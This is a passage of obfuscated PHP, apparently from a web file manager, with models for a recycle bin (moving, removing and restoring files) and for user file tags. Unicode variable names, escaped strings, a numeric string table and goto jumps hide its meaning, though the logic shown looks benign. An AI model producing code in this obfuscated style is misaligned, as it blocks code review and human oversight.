$Dލ = array($e̚Ǩ[478] => $fŷŤ, $e̚Ǩ[423] => 0, $e̚Ǩ[28] => array($e̚Ǩ[380], $d . $e̚Ǩ[381])); $d甕ڦ = $this->field($e̚Ǩ[28])->where($Dލ)->select(); $dؚѿ = array_to_keyvalue($d甕ڦ, $e̚Ǩ[33], $e̚Ǩ[28]); return $this->fileNameAutoGet($dؚѿ, $d, $E߰, $fۆ); } public function fileNameAutoGet($e堄, $Aƾں, $dέ, $Cۭ) { $E̍ =& $_SERVER[]; if ($dέ == REPEAT_REPLACE || !$e堄 || !in_array_not_case($Aƾں, $e堄) || $Cۭ && $dέ != REPEAT_RENAME_FOLDER) { return $Aƾں; } if ($dέ == REPEAT_SKIP) { return !1; } $AѼф = $E̍[95] . get_path_ext($Aƾں); $AѼф = $AѼф == $E̍[95] || $Cۭ ? $E̍[33] : $AѼф; for ($Dذؓ = 1; $Dذؓ <= count($e堄) + 1; $Dذؓ++) { $B̞ = substr($Aƾں, 0, strlen($Aƾں) - strlen($AѼф)); $F = $B̞ . "\50{$Dذؓ}\51{$AѼф}"; if (!in_array_not_case($F, $e堄)) { return $F; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\x65\137\x72\145\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\x65\162\164", "\x66\165\x6e\143\x74\151\157\156")); public function listData($F㔐 = false) { $eל =& $_SERVER[]; $F㔐 = $F㔐 ? $F㔐 : USER_ID; $eЏ׏ = $this->where(array($eל[1524] => $F㔐))->select(); return array_to_keyvalue($eЏ׏, $eל[33], $eל[395]); } public function moveToRecycle($Bݵ) { goto eۄӝ; c׉: $this->recycleMove($Bݵ, 1); if ($e[$F[403]] == $F[87]) { $F = array($F[566] => array($F[525], $e[$F[502]] . $Bݵ . $F[526])); $Cᤢ->where($F)->setField($F[423], 1); } goto aǩ; eۄӝ: $F =& $_SERVER[]; $Cᤢ = Model($F[1209]); $e = $Cᤢ->sourceInfo($Bݵ); goto c; c: if (!$e || $e[$F[423]] == $F[87]) { return; } $c𢶾 = array($F[410] => $Bݵ, $F[1524] => USER_ID, $F[562] => $e[$F[404]], $F[563] => $e[$F[484]], $F[566] => $e[$F[502]]); $this->add($c𢶾); goto c׉; aǩ: } public function clear() { $this->remove(!1); } public function remove($e֙ތ = false, $aðଢ଼ = false) { goto c; c: $c񮜉 =& $_SERVER[]; $aðଢ଼ = $aðଢ଼ ? $aðଢ଼ : USER_ID; $Eѝ = Model($c񮜉[1209]); goto Eߪ; Eߪ: $f蔺 = $this->listData($aðଢ଼); $e֙ތ = $e֙ތ === !1 ? !1 : $e֙ތ; $AΠ = array(); goto fߑ; fߑ: foreach ($f蔺 as $F훪) { if ($e֙ތ != !1 && !in_array($F훪, $e֙ތ)) { continue; } $Cͺ = $Eѝ->sourceInfo($F훪); $Eѝ->remove($F훪, !1); $D = $Cͺ[$c񮜉[404]] . $c񮜉[71] . $Cͺ[$c񮜉[484]]; $AΠ[$D] = array($c񮜉[562] => $Cͺ[$c񮜉[404]], $c񮜉[484] => $Cͺ[$c񮜉[484]]); $this->where(array($c񮜉[395] => $F훪))->delete(); } foreach ($AΠ as $b) { $Eѝ->targetSpaceUpdate($b[$c񮜉[404]], $b[$c񮜉[484]]); } goto a; a: } public function restore($e = false) { $c쩠܉ = $this->listData(); $this->_restoreSource($c쩠܉, $e); } public function removeUserAll($e㗚) { $this->remove(!1, $e㗚); } private function _restoreSource($bٷĥ, $Dնǅ) { goto CȨ; A: if (!$bٷĥ) { return !0; } $BԚ = array(); foreach ($bٷĥ as $F) { goto bх; Dǎ: if ($Bϲ[$a[423]] == $a[87]) { continue; } $AކʤŴ->lockMoveStart($F); $this->recycleMove($F, 0); goto Bَ͗; bх: if ($Dնǅ != !1 && !in_array($F, $Dնǅ)) { continue; } $D̠ = $AކʤŴ->sourceInfo($F); $Bϲ = $AކʤŴ->sourceInfo($D̠[$a[478]]); goto Dǎ; Bَ͗: if ($D̠[$a[403]] == $a[87]) { $c = array($a[566] => array($a[525], $D̠[$a[502]] . $F . $a[526])); $AކʤŴ->where($c)->setField($a[423], 0); $this->restoreFolderChildren($F, $bٷĥ); } $this->where(array($a[395] => $F))->delete(); $AކʤŴ->folderSizeReset($D̠[$a[478]]); goto f; f: $BԚ[] = $D̠[$a[478]]; if ($D̠[$a[403]] == $a[87]) { $BԚ[] = $F; } $AކʤŴ->lockMoveEnd($F); goto fѯ闊; fѯ闊: } goto Dť; CȨ: $a =& $_SERVER[]; $AކʤŴ = Model($a[1209]); $Dնǅ = $Dնǅ == !1 ? !1 : $Dնǅ; goto A; Dť: $AކʤŴ->updateModifyTime($BԚ); goto CĢ; CĢ: } private function restoreFolderChildren($F։, $eг) { goto D¯; D¯: $Aՠ =& $_SERVER[]; $A = Model($Aՠ[1209]); $fǙ = array($Aՠ[395] => array($Aՠ[7], array())); goto fൻ; B: $fǙ[$Aՠ[395]][1] = array_unique($fǙ[$Aՠ[395]][1]); $fǙ[$Aՠ[959]] = $Aՠ[1789]; $A->where($fǙ)->setField($Aՠ[423], 1); goto A; fൻ: foreach ($eг as $aÂ᎒) { if ($aÂ᎒ == $F։) { continue; } if (!$A->isParentOf($F։, $aÂ᎒)) { continue; } $F = $A->sourceInfo($aÂ᎒); if ($F[$Aՠ[403]] == $Aՠ[87]) { $fǙ[] = array($Aՠ[566] => array($Aՠ[525], $F[$Aՠ[502]] . $aÂ᎒ . $Aՠ[526])); } else { $fǙ[$Aՠ[395]][1][] = $aÂ᎒; } } if (!$fǙ[$Aՠ[395]][1]) { unset($fǙ[$Aՠ[395]]); } if (!$fǙ) { return; } goto B; A: } private function recycleMove($Cɲݡ, $b = 1) { $AѮ =& $_SERVER[]; $E¹ = Model($AѮ[1209]); $c = Model($AѮ[1997]); $fÛﵭ = array($AѮ[395] => $Cɲݡ); if ($b) { $E¹->where($fÛﵭ)->setField($AѮ[423], 1); $c->eventRecycle($Cɲݡ, $AѮ[1998]); } else { $e = $E¹->where($fÛﵭ)->find(); $B = $e[$AѮ[403]] == $AѮ[87]; $A򩘬э = $E¹->fileNameAuto($e[$AѮ[478]], $e[$AѮ[28]], REPEAT_RENAME_FOLDER, $B); if ($A򩘬э != $e[$AѮ[28]]) { $E¹->rename($Cɲݡ, $A򩘬э); } $E¹->where($fÛﵭ)->setField($AѮ[423], 0); $c->eventRecycle($Cɲݡ, $AѮ[1999]); } } } goto C엯㣂; D: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Cᄟ) { $A݃Ս =& $_SERVER[]; return array($A݃Ս[1804] => array(USER_ID, $A݃Ս[1805])); } protected function listData() { $FŒ =& $_SERVER[]; $D = array($FŒ[1524] => USER_ID, $FŒ[463] => array($FŒ[1808], 0)); $DІ = $FŒ[1810]; $a = $this->field($DІ)->where($D)->order($FŒ[1811])->select(); return $a ? $a : array(); } protected function listByTag($D) { } protected function addToTag($F, $eݭ) { $A =& $_SERVER[]; if (!Model($A[1945])->listData($eݭ) || !Model($A[795])->pathInfo($F)) { return !1; } $Cߐ = array($A[1524] => USER_ID, $A[463] => $eݭ, $A[414] => $F, $A[415] => $A[409], $A[413] => $A[33], $A[1706] => 0); if ($this->where($Cߐ)->find()) { return !1; } return $this->add($Cߐ); } protected function removeFromTag($BӨ, $c) { $a =& $_SERVER[]; if (!Model($a[1945])->listData($c)) { return !1; } if (is_array($BӨ)) { $BӨ = array($a[7], $BӨ); } $F߇ڗ = array($a[1524] => USER_ID, $a[463] => $c, $a[415] => $a[409], $a[414] => $BӨ); return $this->where($F߇ڗ)->delete(); } protected function removeByTag($f׼) { $B =& $_SERVER[]; if (!$f׼) { return !1; } $a = array($B[1524] => USER_ID, $B[463] => $f׼); return $this->where($a)->delete(); } protected function removeBySource($Eп䋱) { $AĽ =& $_SERVER[]; if (is_array($Eп䋱)) { $Eп䋱 = array($AĽ[7], $Eп䋱); } $E = array($AĽ[1524] => USER_ID, $AĽ[414] => $Eп䋱, $AĽ[463] => array($AĽ[973], 0)); return $this->where($E)->delete(); } }